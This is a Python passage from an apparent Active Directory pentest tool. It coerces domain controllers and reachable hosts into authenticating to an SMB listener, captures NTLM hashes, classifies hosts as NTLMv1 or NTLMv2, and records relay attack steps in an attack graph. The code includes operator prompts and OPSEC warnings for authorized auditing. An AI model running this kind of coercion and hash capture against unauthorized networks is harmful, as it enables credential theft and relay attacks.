            f"    Pivoting coercion through SOCKS5 proxy {mark_sensitive(prepared_proxy_spec, 'text')}",
            spacing="none",
        )

    listener = NativeListenerCapture(listen_host=shell.myip)
    trigger = NativeCoercionTrigger()

    # Match the specific computer account only when we know the target hostname
    # (PDC path, or an explicit IP that resolves to the known PDC). For an
    # arbitrary explicit host we accept any captured principal.
    if prepared_match_expected and prepared.pdc_hostname:
        expected_usernames = [f"{prepared.pdc_hostname}$"]
    else:
        expected_usernames = []
    try:
        result = run_ntlm_capture_probe(
            listener=listener,
            trigger=trigger,
            target=prepared.pdc_ip,
            listener_ip=shell.myip,
            username=prepared.username,
            secret=prepared.secret,
            domain=domain,
            expected_usernames=expected_usernames,
            capture_timeout_seconds=capture_timeout,
            trigger_timeout_seconds=trigger_timeout,
            trigger_auth_mode="smb",
            dc_ip=prepared.pdc_ip,
            method_filter=method_filter,
            proxies=proxies,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error running NTLM capture probe.")
        print_exception(show_locals=False, exception=exc)
        _persist_ntlm_probe_result(
            shell,
            domain=domain,
            result=None,
            status="error",
            reason=type(exc).__name__,
            reachable_ip_count=reachable_ip_count,
            method_filter=method_filter,
        )
        return None

    if result.success:
        persisted_status = "captured"
        persisted_reason = result.reason
    elif ntlm_disabled:
        # No NTLM emitted from a DC where NTLM is known-disabled is the expected,
        # positive hardening outcome - record it as a posture finding, not a
        # failed probe.
        persisted_status = "ntlm_disabled_posture"
        persisted_reason = "ntlm_disabled_posture"
    else:
        persisted_status = "checked"
        persisted_reason = result.reason

    _persist_ntlm_probe_result(
        shell,
        domain=domain,
        result=result,
        status=persisted_status,
        reason=persisted_reason,
        reachable_ip_count=reachable_ip_count,
        method_filter=method_filter,
    )

    redacted_command = list(result.trigger_command)
    if not looks_like_ntlm_hash(prepared.secret):
        for index, token in enumerate(redacted_command):
            if token == "-p" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = "[REDACTED]"
    else:
        for index, token in enumerate(redacted_command):
            if token == "--hashes" and index + 1 < len(redacted_command):
                redacted_command[index + 1] = ":[REDACTED]"
    if redacted_command:
        print_info_debug(
            "[ntlm-capture] trigger command: " + " ".join(map(str, redacted_command))
        )
    print_info_debug(
        "[ntlm-capture] trigger auth mode: "
        f"{result.trigger_auth_mode or 'unknown'} "
        f"(attempted={','.join(result.attempted_trigger_auth_modes) or 'none'})"
    )
    print_info_debug(
        f"[ntlm-capture] native coercion returncode: {result.trigger_returncode!r}"
    )
    if result.trigger_error_kind:
        print_info_debug(
            "[ntlm-capture] native coercion error kind: "
            f"{result.trigger_error_kind} ({result.trigger_error_detail or 'n/a'})"
        )
    if result.listener_returncode is not None:
        print_info_debug(
            "[ntlm-capture] listener exited with return code "
            f"{result.listener_returncode!r} (expected_stop={result.listener_expected_stop})"
        )
    if method_filter:
        print_info_debug(
            f"[ntlm-capture] native coercion method filter: {method_filter}"
        )
    should_log_trigger_output = (
        not result.success
        or bool(result.trigger_error_kind)
        or result.trigger_returncode not in (None, 0)
    )
    if should_log_trigger_output and result.trigger_stdout.strip():
        stdout_summary = _summarize_output(result.trigger_stdout)
        print_info_debug(
            "[ntlm-capture] native coercion stdout:\n"
            + str(mark_sensitive(stdout_summary, "text"))
        )
    if should_log_trigger_output and result.trigger_stderr.strip():
        stderr_summary = _summarize_output(result.trigger_stderr)
        print_info_debug(
            "[ntlm-capture] native coercion stderr:\n"
            + str(mark_sensitive(stderr_summary, "text"))
        )

    return result


def _enabled_computer_ip_count(shell: NtlmCaptureShell, domain: str) -> int:
    """Return the number of enabled computer IPs for the current domain."""

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    targets_file = domain_subpath(
        workspace_cwd,
        shell.domains_dir,
        domain,
        "enabled_computers_ips.txt",
    )
    return count_target_file_entries(targets_file)


def _materialize_ntlmv1_attack_steps(shell: NtlmCaptureShell, domain: str) -> None:
    """Materialize NTLMv1 attack steps into the attack graph (best-effort).

    Thin call-site adapter over
    :func:`adscan_internal.services.ntlmv1_relay_graph_builder.materialize_ntlmv1_relay_edges`
    (the orchestration wrapper that does the graph/posture I/O). The wrapper is
    idempotent and self-guards (no NTLMv1 hosts → no-op), so calling it from both
    the per-host sweep and the DC-only quick win is safe. Failures are captured
    inside the wrapper; this adapter only logs at debug level.
    """

    try:
        from adscan_internal.services.ntlmv1_relay_graph_builder import (  # noqa: PLC0415
            materialize_ntlmv1_relay_edges,
        )

        written = materialize_ntlmv1_relay_edges(shell, domain)
        if written:
            print_info_debug(
                f"[ntlm-capture] materialized {written} NTLMv1 attack-graph edge(s) "
                f"for {mark_sensitive(domain, 'domain')}."
            )
    except Exception as exc:  # noqa: BLE001 - materialization never blocks capture
        telemetry.capture_exception(exc)
        print_info_debug(
            "[ntlm-capture] NTLMv1 attack-step materialization failed: "
            f"{mark_sensitive(str(exc), 'detail')}"
        )


def run_ntlm_auth_type_quick_win(shell: NtlmCaptureShell, target_domain: str) -> bool:
    """Run the Phase 3 NTLM auth-type quick win and persist its outcome."""

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    reachable_ip_count = _enabled_computer_ip_count(shell, target_domain)

    # POSTURE GATE (single source of truth). The DC-only quick win fires coercion
    # directly via `_execute_ntlm_capture_probe` (it does not pass through
    # `_execute_sweep_over_candidates`), so it needs its own pre-emptive gate.
    # When NTLM is known-disabled domain-wide at HIGH confidence, skip BEFORE any
    # listener bind or coercion fire and record the defensive finding. Reuses the
    # shared `_ntlm_disabled_by_posture` helper - no duplicated posture-read logic.
    if _ntlm_disabled_by_posture(shell, target_domain):
        _render_ntlm_disabled_sweep_skip(shell, target_domain)
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="ntlm_disabled",
            reachable_ip_count=reachable_ip_count,
        )
        return False
    print_info_debug(
        f"[ntlm-capture] enabled computer IP count for {mark_sensitive(target_domain, 'domain')}: {reachable_ip_count}"
    )

    if workspace_type == "ctf" and reachable_ip_count < 2:
        marked_domain = mark_sensitive(target_domain, "domain")
        print_info(
            f"[~] Skipping DC NTLM auth-type check in {marked_domain}: fewer than 2 enabled computer IPs are available for this domain."
        )
        print_info_debug(
            "[ntlm-capture] CTF quick win skipped because enabled computer IP count "
            f"is {reachable_ip_count} (< 2)."
        )
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="ctf_enabled_computer_ip_threshold",
            reachable_ip_count=reachable_ip_count,
        )
        return False

    should_execute = True
    if bool(getattr(shell, "auto", False)) or is_non_interactive(shell=shell):
        print_info("[*] Auto mode detected. Proceeding with DC NTLM auth-type check.")
    else:
        pdc = (
            str(shell.domains_data.get(target_domain, {}).get("pdc") or "").strip()
            or "N/A"
        )
        pdc_hostname = (
            str(
                shell.domains_data.get(target_domain, {}).get("pdc_hostname") or ""
            ).strip()
            or "N/A"
        )
        username = (
            str(shell.domains_data.get(target_domain, {}).get("username") or "").strip()
            or "N/A"
        )
        listener_ip = str(getattr(shell, "myip", "") or "").strip() or "N/A"
        should_execute = confirm_operation(
            operation_name="DC NTLM Auth-Type Check",
            description=(
                "Coerces the PDC to authenticate back to the current listener to "
                "classify NTLMv1 vs NTLMv2."
            ),
            context={
                "Domain": target_domain,
                "PDC": pdc,
                "PDC Hostname": pdc_hostname,
                "Username": username,
                "Listener": listener_ip,
                "Trigger": "Native coercion to SMB listener",
                "OPSEC": "Coercion to a listener may be flagged by Defender for Identity, MDI, or SOC NDR",
            },
            default=True,
            icon="🔐",
        )
    if not should_execute:
        print_info("[~] DC NTLM auth-type check skipped by user.")
        _persist_ntlm_probe_result(
            shell,
            domain=target_domain,
            result=None,
            status="skipped",
            reason="user_declined_prompt",
            reachable_ip_count=reachable_ip_count,
        )
        return False

    result = _execute_ntlm_capture_probe(
        shell,
        domain=target_domain,
        capture_timeout=45,
        trigger_timeout=120,
        method_filter=None,
        reachable_ip_count=reachable_ip_count,
    )
    if result is None:
        return False

    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"[+] Captured {result.auth_type} authentication from {marked_user} via PDC coercion."
        )
        _render_captured_hash_jackpot(result, domain=target_domain)
        # The single-DC GOAD case lands here (DC-only quick win). `_persist_ntlm_probe_result`
        # records the DC-scoped `dc_ntlm_auth_type`, but the attack-graph
        # materializer reads the per-host seam (`ntlm_auth_type_by_host`), so
        # mirror the DC's own verdict into that seam first, then materialize the
        # NTLMv1 attack steps into the graph (idempotent, best-effort).
        dc_ip = str(resolve_dc_ip(shell.domains_data.get(target_domain, {})) or "").strip()
        if dc_ip and result.auth_type in {"NTLMv1", "NTLMv2"}:
            captured_user = (
                result.observation.raw_user if result.observation is not None else None
            )
            _persist_ntlm_host_verdict(
                shell,
                domain=target_domain,
                ip=dc_ip,
                auth_type=result.auth_type,
                status="captured",
                reason=None,
                expected_account=_expected_host_account_for_ip(
                    shell, domain=target_domain, ip=dc_ip
                ),
                captured_user=captured_user,
                elapsed_seconds=None,
            )
        _materialize_ntlmv1_attack_steps(shell, target_domain)
        return True

    if _ntlm_disabled_by_posture(shell, target_domain):
        _render_ntlm_disabled_finding(target_domain)
        return False

    _render_failed_ntlm_capture_probe(result)
    _render_no_capture_next_steps(result)
    return False


# --- Per-host NTLMv1/v2 sweep (sub-project #2) ---------------------------------
#
# Reuses the existing single-target coercion probe (`_execute_ntlm_capture_probe`
# with `target_override=ip`) across a SCOPED, GATED set of already-reachable
# hosts so the scan classifies the per-host outbound `LmCompatibilityLevel`
# (NTLMv1 vs NTLMv2) — a defensive posture signal — not only on the DC.
#
# This adds scoping, gating and per-host persistence ONLY. No new offensive
# primitive is written; the relay exploitation and the attack-graph marker are
# sub-project #3 and are explicitly out of scope here.

# Shared-listener fan-out design. The sweep stands up ONE
# ``NativeListenerCapture`` on ``shell.myip`` for the whole run and fires N
# concurrent coercion triggers at it (each trigger coerces one host to
# authenticate back to the single listener). Captures are disambiguated by the
# coerced host's ``<host>$`` computer account, so real parallelism no longer
# conflicts on the bind port (the earlier per-call listener stood up its own
# bind and EADDRINUSE'd under concurrency). Coercion triggers are far lighter
# than full SMB collection, so a moderate default fan-out is safe; it stays
# bounded and env-overridable for OPSEC (more concurrency = more simultaneous
# coercions, which MDI/EDR will see — adscan-ad-constraints §10/§11).
_DEFAULT_SWEEP_CONCURRENCY = 8
_SWEEP_CONCURRENCY_ENV = "ADSCAN_NTLM_SWEEP_CONCURRENCY"
# Global wall-clock budget for the whole sweep. Anything not reached inside the
# budget is logged explicitly (no silent cap — adscan-ad-constraints §10).
_DEFAULT_SWEEP_BUDGET_SECONDS = 1800
_SWEEP_BUDGET_ENV = "ADSCAN_NTLM_SWEEP_BUDGET_SECONDS"
# Per-host capture/trigger budgets. Kept tight so a non-coercible host fails fast
# and is marked `unknown` instead of blocking the sweep.
_SWEEP_CAPTURE_TIMEOUT = 30
_SWEEP_TRIGGER_TIMEOUT = 60
# Shared-listener fan-out timing. ``_SWEEP_LISTENER_SETTLE_SECONDS`` lets the
# single bind go live before the first coercion; ``_SWEEP_DRAIN_SECONDS`` is the
# tail window after the last trigger for in-flight authentications to land on the
# listener before observations are drained and attributed.
_SWEEP_LISTENER_SETTLE_SECONDS = 2.0
_SWEEP_DRAIN_SECONDS = float(_SWEEP_CAPTURE_TIMEOUT)
# Live-dashboard gate. When the operator chose the "all reachable hosts" scope
# AND the candidate set exceeds this threshold, the sweep renders the premium
# live per-host classification dashboard instead of plain per-host log lines.
# Below the threshold (or DC-only scope) the existing log output is kept — a
# handful of hosts does not justify an alt-screen takeover (the static FINAL
# results table is always printed afterwards, at every scale, so a small sweep
# still gets a premium review surface). Env-overridable for operators who want
# the live dashboard sooner / later.
_NTLM_DASHBOARD_MIN_HOSTS = 5
_NTLM_DASHBOARD_MIN_HOSTS_ENV = "ADSCAN_NTLM_DASHBOARD_MIN_HOSTS"
# Poll cadence (seconds) for draining the shared listener while the trigger
# fan-out runs, so the dashboard updates in near-real-time as captures land.
_NTLM_DASHBOARD_POLL_SECONDS = 0.4


def _read_int_env(name: str, default: int) -> int:
    """Return a positive int from env *name*, or *default* on absent/invalid."""

    raw = str(os.getenv(name) or "").strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    return value if value > 0 else default


def _load_reachable_sweep_ips(shell: NtlmCaptureShell, domain: str) -> list[str]:
    """Return the ordered, de-duplicated reachable IP set for *domain*.

    Consumes sub-project #1's output (`enabled_computers_reachable_ips.txt`,
    falling back to `enabled_computers_ips.txt`). Never re-probes reachability.
    """

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    seen: set[str] = set()
    ordered: list[str] = []
    for filename in (
        "enabled_computers_reachable_ips.txt",
        "enabled_computers_ips.txt",
    ):
        path_value = domain_subpath(
            workspace_cwd, shell.domains_dir, domain, filename
        )
        try:
            text = Path(path_value).read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        for line in text.splitlines():
            candidate = line.strip()
            if candidate and candidate not in seen:
                seen.add(candidate)
                ordered.append(candidate)
        if ordered:
            # Prefer the reachable file; only fall back when it yields nothing.
            break
    return ordered


def _resolve_dc_ips(shell: NtlmCaptureShell, domain: str) -> list[str]:
    """Return the known DC IPs for *domain* (pdc + dcs), de-duplicated."""

    domain_data = (shell.domains_data or {}).get(domain) or {}
    seen: set[str] = set()
    ordered: list[str] = []
    primary = resolve_dc_ip(domain_data)
    if primary:
        seen.add(primary)
        ordered.append(primary)
    for value in domain_data.get("dcs") or []:
        candidate = str(value or "").strip()
        if candidate and candidate not in seen:
            seen.add(candidate)
            ordered.append(candidate)
    return ordered


# Sweep scope modes. The engagement type seeds the DEFAULT mode, but the
# operator may always override it via the interactive selection (the product
# owner's requirement: type sets the default, never the hard ceiling).
_SCOPE_MODE_DCS = "dcs"
_SCOPE_MODE_ALL = "all"


def _default_scope_mode_for_type(workspace_type: str) -> str:
    """Map the engagement type to the DEFAULT sweep scope mode.

    ``ctf`` defaults to the broad ``"all"`` scope (every reachable host);
    ``audit`` (and any non-ctf type) defaults to the quiet ``"dcs"`` scope.
    This is only the default — the operator may override it in either
    direction through the interactive selection.
    """

    return _SCOPE_MODE_ALL if workspace_type == "ctf" else _SCOPE_MODE_DCS


def _dc_scope_candidates(reachable: list[str], dc_ips: list[str]) -> list[str]:
    """Return the DC-only candidate set, intersected with *reachable* when known.

    Restricts to DCs that are also in the reachable set when one exists;
    otherwise falls back to the known DCs so a DC-only scope is never empty
    merely because the reachability file has not been populated yet.
    """

    if reachable:
        reachable_lower = {ip.lower() for ip in reachable}
        scoped = [ip for ip in dc_ips if ip.lower() in reachable_lower]
        if scoped:
            return scoped
    return list(dc_ips)


def _candidates_for_scope_mode(
    shell: NtlmCaptureShell,
    domain: str,
    *,
    scope_mode: str,
    reachable: list[str],
) -> list[str]:
    """Return the host candidates to coerce for the chosen ``scope_mode``.

    - ``"all"`` -> every reachable host (the legacy ``ctf`` behaviour).
    - ``"dcs"`` -> DCs only, intersected with the reachable set when known
      (the legacy ``audit`` behaviour).

    Any unrecognized mode degrades to the conservative ``"dcs"`` scope.
    """

    if scope_mode == _SCOPE_MODE_ALL:
        return list(reachable)
    return _dc_scope_candidates(reachable, _resolve_dc_ips(shell, domain))


def _expected_host_account_for_ip(
    shell: NtlmCaptureShell, domain: str, ip: str
) -> str | None:
    """Return the expected ``<host>$`` computer account for *ip*, if known.

    Used to disambiguate a capture as belonging to the coerced host. Reads the
    persisted IP->hostname inventory (sub-project #1's reachability output); never
    synthesizes a hostname from the IP (Kerberos SPN rule — IPs stay IPs).
    """

    try:
        from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
            choose_hostname_for_kerberos_spn,
            load_workspace_ip_hostname_inventory,
        )
    except Exception:  # noqa: BLE001 - inventory is best-effort only
        return None

    workspace_cwd = shell.current_workspace_dir or os.getcwd()
    try:
        inventory = load_workspace_ip_hostname_inventory(
            workspace_dir=workspace_cwd,
            domains_dir=shell.domains_dir,
            domain=domain,
        )
        hostname = choose_hostname_for_kerberos_spn(
            ip=ip, domain=domain, inventory=inventory
        )
    except Exception:  # noqa: BLE001
        return None
    if not hostname:
        return None
    short = hostname.split(".", 1)[0].strip()
    return f"{short}$" if short else None


def _persist_ntlm_host_verdict(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    ip: str,
    auth_type: str | None,
    status: str,
    reason: str | None,
    expected_account: str | None,
    captured_user: str | None,
    elapsed_seconds: float | None,
) -> None:
    """Persist one per-host NTLM auth-type verdict into the workspace map.

    Stores ``ntlm_auth_type in {NTLMv1, NTLMv2, unknown}`` per host (the per-host
    analogue of ``dc_ntlm_auth_type``) under
    ``domains_data[domain]["ntlm_auth_type_by_host"][ip]`` — the #2->#3 seam that
    sub-project #3 reads to materialize the relay attack step. Does NOT write the
    graph surface-marker (that is #3).
    """

    domain_state = shell.domains_data.setdefault(domain, {})
    if not isinstance(domain_state, dict):
        domain_state = {}
        shell.domains_data[domain] = domain_state

    host_map = domain_state.setdefault("ntlm_auth_type_by_host", {})
    if not isinstance(host_map, dict):
        host_map = {}
        domain_state["ntlm_auth_type_by_host"] = host_map

    verdict = auth_type if auth_type in {"NTLMv1", "NTLMv2"} else "unknown"
    host_map[ip] = {
        "ntlm_auth_type": verdict,
        "status": status,
        "reason": reason,
        "expected_account": expected_account,
        "captured_user": captured_user,
        "checked_at": datetime.now(timezone.utc).replace(microsecond=0).isoformat(),
        "source": "coerced_host_capture",
        "elapsed_seconds": round(elapsed_seconds, 2)
        if elapsed_seconds is not None
        else None,
    }


def _build_sweep_account_index(
    shell: NtlmCaptureShell, domain: str, candidates: list[str]
) -> tuple[dict[str, str], dict[str, str]]:
    """Map coerced hosts to their expected ``<host>$`` account for attribution.

    Returns ``(account_casefold_to_ip, ip_to_account)`` where the first maps a
    case-folded ``<host>$`` computer account back to the IP it belongs to (so a
    capture landing on the shared listener can be attributed to the host that
    was coerced), and the second is the per-IP expected account (or ``""`` when
    the hostname is unknown — those IPs cannot be positively attributed and stay
    ``unknown``). Reuses :func:`_expected_host_account_for_ip` for the mapping.
    """

    account_to_ip: dict[str, str] = {}
    ip_to_account: dict[str, str] = {}
    for ip in candidates:
        account = _expected_host_account_for_ip(shell, domain, ip) or ""
        ip_to_account[ip] = account
        if account:
            account_to_ip[account.casefold()] = ip
    return account_to_ip, ip_to_account


def _fire_sweep_coercion(
    shell: NtlmCaptureShell,
    trigger: NativeCoercionTrigger,
    *,
    domain: str,
    target_ip: str,
    listener_ip: str,
    username: str,
    secret: str,
    capture_signal: Any,
    trigger_timeout: int,
) -> bool:
    """Fire ONE native coercion trigger at *target_ip* toward the shared listener.

    Coerces a single host to authenticate back to the run-wide listener bound on
    ``listener_ip``. Captures are NOT read here — they land in the shared
    listener's observation buffer and are attributed afterwards by computer
    account. Returns ``True`` when the trigger ran to completion (returncode 0),
    ``False`` otherwise. A single failing trigger never kills the sweep.
    """

    try:
        execution = trigger.run(
            target=target_ip,
            listener_ip=listener_ip,
            username=username,
            secret=secret,
            domain=domain,
            timeout_seconds=trigger_timeout,
            auth_type="smb",
            dc_ip=target_ip,
            method_filter=None,
            use_kerberos=False,
            capture_signal=capture_signal,
        )
    except Exception as exc:  # noqa: BLE001 - one host must never kill the sweep
        telemetry.capture_exception(exc)
        print_info_debug(
            f"[ntlm-capture][sweep] coercion raised for {mark_sensitive(target_ip, 'ip')}: "
            f"{mark_sensitive(str(exc), 'detail')}"
        )
        return False
    return execution.returncode == 0


# Stable option order for the scope selection — indices MUST NOT change, the
# default-by-type mapping and the skip semantics key off them.
_SWEEP_SCOPE_OPTION_DCS = 0
_SWEEP_SCOPE_OPTION_ALL = 1
_SWEEP_SCOPE_OPTION_SKIP = 2


def _select_sweep_scope_mode(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    workspace_type: str,
    reachable_count: int,
) -> str | None:
    """Let the operator choose the sweep scope; return the mode or ``None`` to skip.

    Renders the OPSEC/MDI heads-up, then offers a 3-way selection via the
    centralized :func:`questionary_select_index` (which auto-resolves to
    ``default_idx`` in non-interactive/CI runs, preserving the exact prior
    type-driven behaviour with zero regression):

    - idx 0 -> "Domain controllers only"  -> ``"dcs"`` scope.
    - idx 1 -> "All reachable hosts (N)"   -> ``"all"`` scope.
    - idx 2 -> "Skip the NTLM auth-type sweep" -> returns ``None``.

    The engagement type seeds the DEFAULT: ``ctf`` -> All reachable hosts
    (idx 1); ``audit`` and any non-ctf -> DCs only (idx 0). The operator may
    override the default in either direction in interactive mode.
    """

    from adscan_core.output import questionary_select_index  # noqa: PLC0415

    marked_domain = mark_sensitive(domain, "domain")
    marked_listener = mark_sensitive(str(getattr(shell, "myip", "") or "N/A"), "ip")

    # OPSEC heads-up shown ABOVE the select so the coercion-noise warning is
    # visible before the operator chooses — especially relevant for the
    # "All reachable hosts" option, which coerces every reachable host.
    print_panel(
        (
            "[bold]NTLM Auth-Type Sweep[/bold] — classify NTLMv1 vs NTLMv2 per host "
            "(a defensive downgrade-misconfiguration signal).\n"
            f"[bold]Domain[/bold]   {marked_domain}\n"
            f"[bold]Listener[/bold] {marked_listener}\n"
            "[bold]Trigger[/bold]  Native coercion to an SMB listener (one per host)\n\n"
            "[yellow][!] OPSEC:[/yellow] coercion forces each chosen host to authenticate "
            "back to the listener. "
            f"Choosing [bold]All reachable hosts ({reachable_count})[/bold] fires coercion "
            "against every reachable host — Defender for Identity, MDI, or SOC NDR will see "
            "it. Domain-controllers-only is the quiet option; the DC-only classification is "
            "still reportable on its own."
        ),
        title="🔐 [bold]NTLM Auth-Type Sweep[/bold]",
        title_align="left",
        border_style="yellow",
    )

    options = [
        "Domain controllers only",
        f"All reachable hosts ({reachable_count})",
        "Skip the NTLM auth-type sweep",
    ]
    default_mode = _default_scope_mode_for_type(workspace_type)
    default_idx = (
        _SWEEP_SCOPE_OPTION_ALL
        if default_mode == _SCOPE_MODE_ALL
        else _SWEEP_SCOPE_OPTION_DCS
    )

    selected_idx = questionary_select_index(
        title=f"Choose the NTLM auth-type sweep scope for {domain}",
        options=options,
        default_idx=default_idx,
        shell=shell,
    )
    # A cancelled prompt (None) resolves to the conservative type default rather
    # than silently skipping — matches the centralized helper's non-interactive
    # contract and keeps CI behaviour identical to the prior confirm gate.
    if selected_idx is None:
        selected_idx = default_idx

    chosen_label = options[selected_idx] if 0 <= selected_idx < len(options) else "unknown"
    print_info_debug(
        f"[ntlm-capture][sweep] scope selection for {marked_domain}: "
        f"idx={selected_idx} ({chosen_label}) "
        f"type={workspace_type or 'unknown'} default_idx={default_idx}"
    )

    if selected_idx == _SWEEP_SCOPE_OPTION_SKIP:
        return None
    if selected_idx == _SWEEP_SCOPE_OPTION_ALL:
        return _SCOPE_MODE_ALL
    return _SCOPE_MODE_DCS


def _maybe_build_sweep_dashboard(
    *,
    scope_mode: str,
    candidates: list[str],
    ip_to_account: dict[str, str],
) -> Any | None:
    """Return a live :class:`NtlmSweepDashboard`, or ``None`` to keep log output.

    Gated to the "all reachable hosts" scope above
    ``_NTLM_DASHBOARD_MIN_HOSTS`` (env-overridable). Below the threshold or for
    the DC-only scope, returns ``None`` so the sweep keeps the existing plain
    per-host log output (a handful of hosts does not justify an alt-screen
    takeover). Construction failures are swallowed — the sweep must proceed with
    logging even if the dashboard cannot be built.
    """

    if scope_mode != _SCOPE_MODE_ALL:
        return None
    threshold = _read_int_env(_NTLM_DASHBOARD_MIN_HOSTS_ENV, _NTLM_DASHBOARD_MIN_HOSTS)
    if len(candidates) <= threshold:
        return None
    try:
        from adscan_core.tui import NtlmSweepDashboard  # noqa: PLC0415

        return NtlmSweepDashboard(
            candidates=list(candidates),
            ip_to_account=dict(ip_to_account),
        )
    except Exception as exc:  # noqa: BLE001 - dashboard is never load-bearing
        telemetry.capture_exception(exc)
        print_info_debug(
            "[ntlm-capture][sweep] live dashboard unavailable; falling back to "
            f"plain logging: {mark_sensitive(str(exc), 'detail')}"
        )
        return None


def _print_sweep_results_table(
    *,
    domain: str,
    result_rows: list[dict[str, Any]],
    summary: dict[str, Any],
) -> None:
    """Print the static, review-grade NTLM results table to scrollback.

    The premium "review the verdict" surface, printed after EVERY sweep that
    swept >= 1 host (callers skip it on a 0-host skip/decline). Rendered via the
    shared :func:`get_console` so it auto-mirrors to the telemetry recording (no
    new ``Console``). Wrapped fail-safe: a render/print error never aborts or
    fails the sweep — the scattered per-host log lines still stand.
    """

    if not result_rows:
        return
    try:
        from adscan_internal.rich_output import get_console  # noqa: PLC0415
        from adscan_core.tui import render_ntlm_results_table  # noqa: PLC0415

        table_summary = dict(summary)
        table_summary["domain"] = domain
        get_console().print(
            render_ntlm_results_table(result_rows, table_summary)
        )
    except Exception as exc:  # noqa: BLE001 - presentation must never break the sweep
        telemetry.capture_exception(exc)
        print_info_debug(
            "[ntlm-capture][sweep] failed to render final results table: "
            f"{mark_sensitive(str(exc), 'detail')}"
        )


def _run_sweep_fanout(
    *,
    domain: str,
    candidates: list[str],
    fire: Any,
    concurrency: int,
    budget_seconds: int,
    start: float,
    budget_exhausted: Any,
    listener: Any,
    fired_ips: set[str],
    fired_lock: Any,
    dashboard: Any | None,
) -> list[Any]:
    """Run the bounded coercion fan-out and return the drained observations.

    When *dashboard* is provided, the main thread polls the shared listener on a
    short tick (``_NTLM_DASHBOARD_POLL_SECONDS``) while the trigger
    ``ThreadPoolExecutor`` drains, re-rendering the live per-host classification
    table as captures land — the premium live-visualization path. When it is
    ``None`` the loop is the plain ``as_completed`` drain. Either way the global
    budget, ``cancel_futures`` truncation semantics, and the final reconciling
    drain are identical: the dashboard is presentation-only.

    Dashboard render/update is wrapped so a render error never aborts the sweep.
    """

    import concurrent.futures  # noqa: PLC0415
    import time  # noqa: PLC0415

    def _poll_dashboard() -> None:
        if dashboard is None:
            return
        try:
            with fired_lock:
                completed = set(fired_ips)
            dashboard.update_from_observations(
                listener.drain_observations(), completed
            )
        except Exception as exc:  # noqa: BLE001 - render must never abort the sweep
            telemetry.capture_exception(exc)

    def _drive(session_dashboard: Any | None) -> None:
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=concurrency)
        try:
            futures = {executor.submit(fire, ip): ip for ip in candidates}
            pending = set(futures)
            while pending:
                if budget_seconds - (time.monotonic() - start) <= 0:
                    # Out of global budget; signal still-queued workers to bail
                    # and cancel not-yet-started triggers (no silent cap — the
                    # truncation is logged by the caller). Attribute captures so
                    # far.
                    budget_exhausted.set()
                    break
                # Poll on a short tick so the dashboard updates in near-real-time
                # as captures land. With no dashboard the timeout still bounds the
                # wait so the budget check above stays responsive.
                done, pending = concurrent.futures.wait(
                    pending,
                    timeout=_NTLM_DASHBOARD_POLL_SECONDS,
                    return_when=concurrent.futures.FIRST_COMPLETED,
                )
                for future in done:
                    try:
                        future.result()
                    except Exception as exc:  # noqa: BLE001 - one host never kills the sweep
                        telemetry.capture_exception(exc)
                if session_dashboard is not None:
                    _poll_dashboard()
        finally:
            # cancel_futures drops not-yet-started triggers; in-flight ones run
            # to completion. Only completed ``fire`` calls record into fired_ips.
            executor.shutdown(wait=True, cancel_futures=True)

    if dashboard is not None:
        def _summary_results_table(console: Any) -> None:
            # After the alt-screen pops, re-print the cleaner STATIC results
            # table to scrollback (replacing the dashboard's own re-print, so we
            # never double-print). Snapshot the dashboard's own attributed rows —
            # they match the authoritative verdicts the caller persists.
            try:
                from adscan_core.tui import render_ntlm_results_table  # noqa: PLC0415

                console.print(
                    render_ntlm_results_table(
                        dashboard.results_rows(),
                        dashboard.results_summary(domain=domain),
                    )
                )
            except Exception as exc:  # noqa: BLE001 - render must never break the flow
                telemetry.capture_exception(exc)

        with dashboard.live_session(summary=_summary_results_table) as live_dashboard:
            _drive(live_dashboard)
            # Drain window: let any in-flight authentications land on the
            # listener, polling so the dashboard keeps updating during the tail.
            drain_deadline = time.monotonic() + (
                _SWEEP_DRAIN_SECONDS if fired_ips else 0.0
            )
            while time.monotonic() < drain_deadline:
                time.sleep(_NTLM_DASHBOARD_POLL_SECONDS)
                _poll_dashboard()
            observations = listener.drain_observations()
            # Final reconcile of any late captures before the alt-screen pops.
            _poll_dashboard()
            return observations

    _drive(None)
    # Drain window: let any in-flight authentications land on the listener.
    time.sleep(_SWEEP_DRAIN_SECONDS if fired_ips else 0.0)
    return listener.drain_observations()



def run_ntlm_auth_type_sweep(shell: NtlmCaptureShell, domain: str) -> dict[str, Any]:
    """Classify NTLMv1/v2 per host over a scoped, type-gated, reachable host set.

    Phase-3 entry point (the phase wiring lives in ``adscan.py`` and is owned by a
    separate change). Reuses the existing single-target coercion probe per host;
    adds operator-chosen scoping, the OPSEC heads-up, a >=2-reachable relay gate,
    bounded concurrency, a global budget, and per-host persistence.

    Scope selection. The engagement type (``shell.type``) seeds the DEFAULT, but
    the operator may always CHOOSE the scope via the centralized 3-way select:
        - idx 0 "Domain controllers only"  -> DCs in the reachable set.
        - idx 1 "All reachable hosts (N)"   -> every reachable host.
        - idx 2 "Skip the NTLM auth-type sweep" -> skip; run the DC-only quick win.
    Default by type: ``ctf`` -> All reachable hosts (idx 1); ``audit`` and any
    non-ctf -> DCs only (idx 0). Non-interactive/CI auto-resolves to the type
    default, preserving the prior type-driven behaviour exactly.

    Returns a summary dict with the per-host telemetry counters.
    """

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    marked_domain = mark_sensitive(domain, "domain")

    summary: dict[str, Any] = {
        "domain": domain,
        "workspace_type": workspace_type,
        "swept_count": 0,
        "ntlmv1_found": 0,
        "ntlmv2_found": 0,
        "coercion_unknown": 0,
        "sweep_skipped_reason": None,
        "truncated_count": 0,
    }

    # POSTURE GATE (single source of truth). Skip BEFORE the scope prompt and the
